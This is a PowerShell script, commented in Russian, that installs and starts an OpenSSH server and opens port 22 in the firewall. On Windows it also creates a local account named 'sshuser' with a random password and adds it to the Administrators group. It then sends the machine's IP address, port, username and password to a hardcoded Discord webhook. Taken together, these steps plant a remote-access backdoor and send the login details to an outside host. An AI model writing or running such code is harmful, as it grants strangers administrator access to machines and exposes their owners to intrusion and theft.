try {
    $StopWatch = [system.diagnostics.stopwatch]::startNew()

    # Устанавливаем SSH Server
    if ($IsLinux) {
        & sudo apt install openssh-server -y
    } else {
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
        Start-Service sshd
        Set-Service -Name sshd -StartupType 'Automatic'

        # Настраиваем firewall, если правила нет
        if (-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
        }
    }

    # Генерируем случайный пароль
    $Password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })

    # Добавляем пользователя для подключения (только Windows)
    if (-not $IsLinux) {
        $Username = "sshuser"
        net user $Username $Password /add
        net localgroup administrators $Username /add
    }

    # Получаем IP-адрес
    $IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress

    # Настройки порта
    $Port = 22

    # Отправляем данные в Discord
    $WebhookURL = 'https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs'
    $Message = @{
        content = "🛠️ OpenSSH Server установлен!\nIP: $IPAddress\nPort: $Port\nUser: $Username\nPassword: $Password"
    }
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body (ConvertTo-Json $Message -Depth 10) -ContentType 'application/json'

    [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
    "✅ Установка завершена за $Elapsed сек."
} catch {
    Write-Host "⚠️ Ошибка в строке $($_.InvocationInfo.ScriptLineNumber): $($Error[0])" -ForegroundColor Red
} finally {
    Write-Host "Нажмите любую клавишу для выхода..." -ForegroundColor Yellow
    Pause
}
